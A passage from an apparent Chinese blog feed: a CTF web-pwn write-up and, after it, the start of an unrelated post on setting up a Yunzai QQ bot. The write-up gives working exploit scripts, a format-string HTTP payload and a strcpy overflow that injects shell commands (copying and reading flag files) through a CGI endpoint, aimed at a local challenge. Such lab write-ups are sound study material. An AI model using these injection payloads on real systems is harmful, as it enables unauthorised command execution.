class="string">&quot;Welcome to  c0ke&#x27;s simplified pwntools template!!!&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Usage : \n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;       python mode.py HOST PORT\n &quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;       python mode.py [0/1][debug]]\n &quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"><span class="keyword">elif</span> <span class="built_in">len</span>(sys.argv)==<span class="number">2</span>:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    <span class="keyword">if</span>(sys.argv[<span class="number">1</span>]== <span class="string">&#x27;1&#x27;</span>):</span><br><span class="line">        LOCAL = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        LOCAL = <span class="number">0</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    REMOTE = <span class="number">1</span></span><br><span class="line">    server_ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">    server_port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------func-----------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">db</span>():</span><br><span class="line">    <span class="keyword">if</span> (LOCAL):</span><br><span class="line">        gdb.attach(io,<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        b *0x0000000000401806</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func_name,func_ad</span>):</span><br><span class="line">    p(func_name,func_ad)</span><br><span class="line">    <span class="keyword">global</span> libc </span><br><span class="line">    libc = LibcSearcher(func_name,func_ad)</span><br><span class="line">    libcbase=func_ad-libc.dump(func_name)</span><br><span class="line">    li(<span class="string">&#x27;libcbase&#x27;</span>,libcbase)</span><br><span class="line">    <span class="keyword">return</span> libcbase</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cat_flag</span>():</span><br><span class="line">    flag_header = <span class="string">b&#x27;flag&#123;&#x27;</span></span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    sl(<span class="string">&#x27;cat flag&#x27;</span>)</span><br><span class="line">    ru(flag_header)</span><br><span class="line">    flag = flag_header + ru(<span class="string">&#x27;&#125;&#x27;</span>) + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------exploit--------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">    code = <span class="string">&#x27;cp /start.sh /tmp/flag&#x27;</span></span><br><span class="line">    code = code + <span class="string">&#x27;;&#x27;</span></span><br><span class="line">    code = code.ljust(<span class="number">30</span>, <span class="string">&#x27;a&#x27;</span>) + <span class="string">&#x27;;&#x27;</span></span><br><span class="line">                                                                            </span><br><span class="line">    request = <span class="string">&quot;GET /cgi-bin/note_handle%2572?action=add,print,get_flag&amp;content=&#123;&#125;\(@@%30$c%30$c%30$c%30$c%30$c%136c%14$hhn HTTP/1.1\r\n&quot;</span>.<span class="built_in">format</span>(code)</span><br><span class="line">    request += <span class="string">&quot;Host: 127.0.0.1\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;Cache-Control: max-age=0\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;Upgrade-Insecure-Requests: 1\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;X-Forwarded-For: 127.0.0.1\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;Accept-Encoding: gzip, deflate\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;Accept-Language: zh-CN,zh;q=0.9\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;If-Modified-Since: Mon, 08 Jul 2024 04:01:37 GMT\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;Connection: close\r\n&quot;</span></span><br><span class="line">    request += <span class="string">&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    db()</span><br><span class="line">    li(<span class="string">&quot;request  --------------&gt;\n%s&quot;</span>%request)</span><br><span class="line">    s(request.encode())</span><br><span class="line">    response = r(<span class="number">0x2000</span>)</span><br><span class="line">    <span class="built_in">print</span>(response.decode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">finish</span>():</span><br><span class="line">    ia()</span><br><span class="line">    c()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> REMOTE:</span><br><span class="line">        io = remote(server_ip, server_port)</span><br><span class="line">        <span class="keyword">if</span> LIBC:</span><br><span class="line">            libc = ELF(libc_path)</span><br><span class="line">        elf = ELF(elf_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        elf = ELF(elf_path)</span><br><span class="line">        <span class="keyword">if</span> LIBC:</span><br><span class="line">            libc = ELF(libc_path)</span><br><span class="line">            io = elf.process()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            io = elf.process()</span><br><span class="line"></span><br><span class="line">    exploit()</span><br><span class="line">    finish()</span><br></pre></td></tr></table></figure></div>
<h3 id="desktop">2.desktop</h3>
<h4 id="xinetd信息">xinetd信息</h4>
<p><code>xinetd</code> 配置文件是用于配置和管理 <code>xinetd</code>
服务的文件。<code>xinetd</code>（Extended Internet Service
Daemon）是一个超级服务器守护进程，用于管理和启动各种 Internet 服务（如
FTP、Telnet
等），它可以监听指定的端口并在有连接请求时启动相应的服务。</p>
<h5 id="xinetd配置文件的主要类型">xinetd配置文件的主要类型</h5>
<ol type="1">
<li><strong>主配置文件</strong> (<code>/etc/xinetd.conf</code>):
<ul>
<li>这是 <code>xinetd</code>
的全局配置文件，用于设置全局选项，如日志记录、服务目录等。</li>
</ul></li>
<li><strong>服务配置文件</strong> (<code>/etc/xinetd.d/</code> 目录):
<ul>
<li>在这个目录中，每个文件定义了一个服务的配置。这些文件可以定义服务的启动方式、端口、协议、运行环境等。我们dockerfile中就有一句COPY
./pwn.xinetd /etc/xinetd.d/pwn，将配置导进去。</li>
</ul></li>
</ol>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">service pwn</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">disable</span> = no</span><br><span class="line">    flags = REUSE</span><br><span class="line">    socket_type = stream</span><br><span class="line">    protocol    = tcp</span><br><span class="line">    <span class="built_in">wait</span>        = no</span><br><span class="line">    user        = root</span><br><span class="line">    <span class="built_in">type</span>        = UNLISTED</span><br><span class="line">    port        = 1933</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">bind</span>        = 0.0.0.0</span><br><span class="line">    server      = /usr/sbin/chroot   </span><br><span class="line">    server_args = --userspec=1000:1000 /home/pwn ./pwn /var/www/html 2&gt;/dev/null</span><br><span class="line">    <span class="comment"># safety options</span></span><br><span class="line">    per_source  = 5 <span class="comment"># the maximum instances of this service per source IP address</span></span><br><span class="line">    rlimit_cpu  = 20 <span class="comment"># the maximum number of CPU seconds that the service may use</span></span><br><span class="line">    rlimit_as  = 100M <span class="comment"># the Address Space resource limit for the service</span></span><br><span class="line">    <span class="comment">#access_times = 8:50-17:10</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h5 id="相关设置解释">相关设置解释</h5>
<p><strong><code>disable = no</code></strong>:</p>
<ul>
<li>表示该服务是启用的。</li>
</ul>
<p><strong><code>flags = REUSE</code></strong>:</p>
<ul>
<li>允许重用端口，使得服务能够在连接关闭后快速重新绑定端口。</li>
</ul>
<p><strong><code>socket_type = stream</code></strong>:</p>
<ul>
<li>指定服务使用流套接字（即 TCP），用于可靠的双向通信。</li>
</ul>
<p><strong><code>protocol = tcp</code></strong>:</p>
<ul>
<li>指定使用 TCP 协议。</li>
</ul>
<p><strong><code>wait = no</code></strong>:</p>
<ul>
<li>指定服务不等待新连接，而是立即返回并处理新的连接请求。</li>
</ul>
<p><strong><code>user = root</code></strong>:</p>
<ul>
<li>指定服务以 root
用户身份运行。这意味着服务将具有系统上最高权限，因此需要小心安全设置。</li>
</ul>
<p><strong><code>type = UNLISTED</code></strong>:</p>
<ul>
<li>表示服务不是标准服务（即不在服务列表中）。</li>
</ul>
<p><strong><code>port = 1933</code></strong>:</p>
<ul>
<li>指定服务监听的端口是 1933。我们就是把主机端口映射到这个端口。</li>
</ul>
<p><strong><code>bind = 0.0.0.0</code></strong>:</p>
<ul>
<li>表示服务绑定在所有网络接口上，允许来自任何 IP 地址的连接。</li>
</ul>
<p><strong><code>server = /usr/sbin/chroot</code></strong>:</p>
<ul>
<li>指定用于运行服务的命令。在这里，<code>chroot</code>
用于创建一个新的根文件系统环境，以限制服务的访问范围。</li>
</ul>
<p><strong><code>server_args = --userspec=1000:1000 /home/pwn ./pwn /var/www/html 2&gt;/dev/null</code></strong>:</p>
<ul>
<li><code>--userspec=1000:1000</code>：指定以用户 ID 1000 和组 ID 1000
的权限运行 <code>pwn</code> 程序。根据配置，用户 ID 1000 可能是
<code>pwn</code> 用户。</li>
<li><code>/home/pwn</code>：指定 <code>chroot</code> 环境的根目录。</li>
<li><code>./pwn</code>：指定要执行的二进制文件
<code>pwn</code>。这个路径相对于 <code>/home/pwn</code>。</li>
<li><code>/var/www/html</code>：<code>pwn</code> 程序的参数，可能是 Web
服务器的根目录或其他服务相关目录。</li>
<li><code>2&gt;/dev/null</code>：将错误输出重定向到
<code>/dev/null</code>，忽略错误信息。</li>
</ul>
<p><strong><code>per_source = 5</code></strong>:</p>
<ul>
<li>限制每个源 IP 地址可以启动的服务实例数量为 5 个。</li>
</ul>
<p><strong><code>rlimit_cpu = 20</code></strong>:</p>
<ul>
<li>限制服务可以使用的最大 CPU 时间为 20 秒。</li>
</ul>
<p><strong><code>rlimit_as = 100M</code></strong>:</p>
<ul>
<li>限制服务使用的最大地址空间为 100 MB。</li>
</ul>
<p><strong><code>access_times = 8:50-17:10</code></strong>（注释掉了）:</p>
<ul>
<li>如果启用，限制服务的访问时间。</li>
</ul>
<h4 id="环境搭建踩坑">环境搭建踩坑</h4>
<p>这里题目给出的镜像如果直接build的话可能会有以下报错</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212642490.png"
                      class=""
                >
<p>解决方法可以是在dockerfile中手动把requests的版本指定好，我本地requests==2.21.0可以成功构建。</p>
<p>然后IDA调试中，其中上面设置的信息的路径是容器中的路径，然后我用主机的6666端口映射到容器中gdbserver的默认端口</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212651224.png"
                      class=""
                >
<p>之后patch时除了patch出一个死循环以外，还要把alarm给nop掉，不然会很快退出。</p>
<p>之后要curl连的时候注意在容器中用的端口是它虚拟的端口，而不是主机映射的端口。（这里我把主机1337映射到容器1933端口）</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212700543.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212709096.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212717324.png"
                      class=""
                >
<p>然后把死循环跳转改回来就可以继续调试了。这种方法也可以用于上一题的调试。</p>
<h4 id="题目信息">题目信息</h4>
<p>前面的一些检测正常发包是不会被卡住的，除非curl时手动加上的X-Forwarded-For长度或格式不对。</p>
<p>main函数主要逻辑在这里，其中会从Cgi表中逐个匹配我们所请求的资源名，如果匹配上就检测X-Forwarded-For的值是否为192.168.1.x(x&lt;=20)，这里dest全局变量就是存着X-Forwarded-For的值。v21是'?'后面的get请求参数，必须要有。v22是ring_token参数，也必须被设置。之后会调用对应的cgi函数。题目中的cgi函数有那么几个：login.cgi，logout.cgi，wifictl.cgi，logctl.cgi。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212726642.png"
                      class=""
                >
<p>然后我们查看函数表，发现里面有popen危险函数，然后看交叉引用就能找到logctl的具体实现。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212734273.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212742727.png"
                      class=""
                >
<p>然后就能看到其具体实现，我们的目标就很明确了，想办法实现command的任意控制。</p>
<h4 id="利用方式-1">利用方式</h4>
<p>这里sscanf函数没见过，查一下是可以以一个格式化字符串匹配，然后把第一个参数分割成若干块存在后面的参数中。</p>
<p><code>%[^:]</code>表示匹配直到遇到下一个冒号为止的所有字符，并将它们存储在第二个参数指定的字符数组中。</p>
<p>首先得绕过logctl函数中前面两个判断，token的格式必须为
<code>数字:数字</code>，然后：前面的数字会和两个值进行比较，要在范围外才能过。那么我们继续看交叉引用。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212751018.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212759252.png"
                      class=""
                >
<p>发现是一个时间值，而且如果调用wifictl会把这个值打印出来。那么只要先访问这个cgi，就可以得到time的值，而另一端边界值固定为0x3c，那么我们设置token前半部分为time+1就行。</p>
<p>之后发现command的值与v5有关，sub_402CAC这个函数会获取特殊字符，而前面的ban_char函数则是漏洞所在点。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/09/21/webpwn/image-20240921212812164.png"
                      class=""
                >
<p>主体逻辑是判断是否有v12中存的非法字符，我们通过logctl本体中<code>echo no support char is %s &gt; /var/www/blockingString</code>就能猜测这个逻辑。但是strcpy(s,a2)没有长度限制，可以溢出写v14，最后又会把v14写回a3，也就是v5，就实现了对command的控制。a2就是我们get传的参数值，上面会进行遍历参数键值对，所以我们用哪个参数触发漏洞都行。</p>
<p>之后就能直接打了，由于是与web服务器交互，所以要用request库进行exp编写。这里我也懒得再写一份exp了，直接用提供的exp，改个端口，能正常获取flag。</p>
<h5 id="exp-1">exp</h5>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">if</span> url[<span class="built_in">len</span>(url) - <span class="number">1</span>] != <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Target URL Format Error,The last char in url must be &#x27;/&#x27;.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    warnings.filterwarnings(<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    s = requests.session()</span><br><span class="line">    s.verify = <span class="literal">False</span></span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Forword-For&#x27;</span>: <span class="string">&#x27;192.168.1.1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># print(&quot;[+] login...&quot;)</span></span><br><span class="line">        ret = s.get(<span class="string">&quot;&#123;&#125;wifictl.cgi?ring_token=1&quot;</span>.<span class="built_in">format</span>(url), headers=header, timeout=<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> ret.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;now time is&quot;</span> <span class="keyword">in</span> ret.content.decode():</span><br><span class="line">                time_ret = re.search(<span class="string">r&quot;now time is (.+?)\.\n&quot;</span>,ret.content.decode())</span><br><span class="line">                <span class="keyword">if</span> time_ret <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[-] time_ret re error, cannot get time&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    now_time = time_ret.group(<span class="number">1</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;[+] now time is &quot;</span> + now_time)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] time_ret re error, cannot get time&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] status_code error, cannot get time&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        cmd = <span class="string">&quot;a;&quot;</span> + <span class="string">&quot;a&quot;</span>*<span class="number">1311</span> + <span class="string">&quot;cat /flag &gt;/var/www/html/flag;&quot;</span>       </span><br><span class="line">        new_url = <span class="string">&quot;&#123;&#125;logctl.cgi?ring_token=&#123;&#125;:1&amp;aa=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(url, <span class="built_in">int</span>(now_time)+<span class="number">1</span>, cmd)</span><br><span class="line">        ret = s.get(new_url, headers=header, timeout=<span class="number">8</span>)</span><br><span class="line">        ret = s.get(<span class="string">&quot;&#123;&#125;flag&quot;</span>.<span class="built_in">format</span>(url), headers=header, timeout=<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> ret.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(ret.content.decode())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] status_code error, cannot get flag&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        </span><br><span class="line">        cmd = <span class="string">&quot;a;&quot;</span> + <span class="string">&quot;a&quot;</span>*<span class="number">1311</span> + <span class="string">&quot;rm /var/www/html/flag;&quot;</span></span><br><span class="line">        new_url = <span class="string">&quot;&#123;&#125;logctl.cgi?ring_token=&#123;&#125;:1&amp;aa=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(url, <span class="built_in">int</span>(now_time)+<span class="number">1</span>, cmd)</span><br><span class="line">        ret = s.get(new_url, headers=header, timeout=<span class="number">8</span>)</span><br><span class="line">        <span class="keyword">if</span> ret.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] status_code error, cannot rm flag&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> reason:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;timed&#x27;</span> <span class="keyword">in</span> <span class="built_in">repr</span>(reason) <span class="keyword">or</span> <span class="string">&#x27;timeout&#x27;</span> <span class="keyword">in</span> <span class="built_in">repr</span>(reason):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] Fail, can not connect target for: timeout&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] Fail, can not connect target for: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">repr</span>(reason)))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp(<span class="string">&quot;http://127.0.0.1:1337/&quot;</span>)</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>云崽bot基础搭建过程记录</title>
    <url>/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="云崽bot基础搭建过程记录">云崽bot基础搭建过程记录</h2>
<p>突发奇想想要搭建一个qqbot玩玩，经同学推荐，准备从最简单的yunzai框架入手。</p>
<h4 id="安装">安装</h4>
<blockquote>
<p>环境准备：Windows/Linux/MacOS/Android <a class="link" 
 href="https://nodejs.org/" >Node.js(&gt;=v21)<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, <a class="link" 
 href="https://redis.io/" >Redis<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>, <a class="link" 
 href="https://git-scm.com/" >Git<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</blockquote>
<h5 id="redis安装">redis安装</h5>
<ul>
<li><p>下载地址<a class="link" 
 href="https://gitee.com/link?target=https%3A%2F%2Fwwrl.lanzouw.com%2Fiml4v0xwo0za" >redis<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>,密码:114514</p></li>
<li><p>解压后启动redis-server.exe这个文件。</p></li>
<li><p>将redis-server.exe所在的目录添加进环境变量，这样yunzai启动时会自动找到redis并启动</p></li>
</ul>
<h5 id="nodejs安装">nodejs安装</h5>
<p><a class="link"   href="https://nodejs.cn/download/" >nodejs中文网<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<ul>
<li>windows操作系统的话直接下64位msi文件一键安装就行了</li>
<li>linux的话下下来是一个<code>.tar.xz</code>文件，<code>tar -xvf xxx.tar.xz</code>就能够解压出来，然后把<code>./bin/</code>目录放到环境变量里去就行，<code>export PATH=/path/to/node-v20.18.0-linux-x64/bin:$PATH</code>，不想每次都重新设置环境变量就直接在<code>~/.bashrc</code>中加这一行命令</li>
</ul>
<h5 id="git安装">git安装</h5>
<ul>
<li>windows：https://git-scm.com/downloads/win</li>
<li>linux：<code>sudo apt update | sudo apt install git</code></li>
</ul>
<h5 id="yunzai本体安装">yunzai本体安装</h5>
<p>有了如上几个必选项后</p>
<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">git clone --depth <span class="number">1</span> https://gitee.com/TimeRainStarSky/Yunzai</span><br><span class="line"><span class="built_in">cd</span> Yunzai</span><br></pre></td></tr></table></figure></div>
<h4 id="启动">启动</h4>
<p>在yunzai目录下启动：</p>
<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">node .</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241124135258312.png"
                      class=""
                >
<h4 id="启动协议端">启动协议端</h4>
<p>“协议端” 是指实现 QQ
通信协议的服务组件。不同的协议端提供了不同的功能和适配方式，例如：</p>
<ul>
<li><strong>OneBot v11</strong>：支持标准化的 OneBot
协议，可以与多种第三方服务交互。</li>
<li><strong>ComWeChat</strong>：通过仿 QQ 客户端的方式实现通信。</li>
<li><strong>GSUIDCore</strong> 和
<strong>OPQBot</strong>：各自提供不同的兼容特性和扩展。</li>
</ul>
<p>这些协议端负责处理与 QQ
的连接（包括登录、消息收发等），为机器人提供基础的通信能力。</p>
<p>启动协议端的目的是：</p>
<ul>
<li>连接到 QQ 服务器并登录指定的 QQ 账号。</li>
<li>监听来自 QQ 的消息（例如群聊消息、私聊消息等）。</li>
<li>转发消息到 Yunzai-Bot 的核心逻辑，进行处理。</li>
<li>将 Yunzai-Bot 处理后的响应结果（如回复消息）发送回 QQ。</li>
</ul>
<h4 id="账号绑定">账号绑定</h4>
<h5 id="协议端绑定">协议端绑定</h5>
<p>我们选用OneBotv11作为协议端，下载并运行<code>Lagrange.OneBot</code>后改配置，这里实际上是配置了一个反向
WebSocket
连接，而在<code>yunzai/config/config/bot.yaml</code>中实际有指定服务器开放的端口为2536，所以我们要在协议端开放2536端口。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125003714736.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/11/27/%E4%BA%91%E5%B4%BDbot%E5%9F%BA%E7%A1%80%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B%E8%AE%B0%E5%BD%95/image-20241125003412271.png"
                      class=""
                >
<p>修改过后大概长这样：</p>
<div class="highlight-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Logging&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;LogLevel&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Default&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Information&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Microsoft&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Warning&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Microsoft.Hosting.Lifetime&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Information&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;SignServerUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span>	</span><br><span class="line">    <span class="attr">&quot;SignProxyUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;MusicSignServerUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Account&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Uin&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;Protocol&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Linux&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;AutoReconnect&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;GetOptimumServer&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Message&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;IgnoreSelf&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;StringPost&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;QrCode&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span 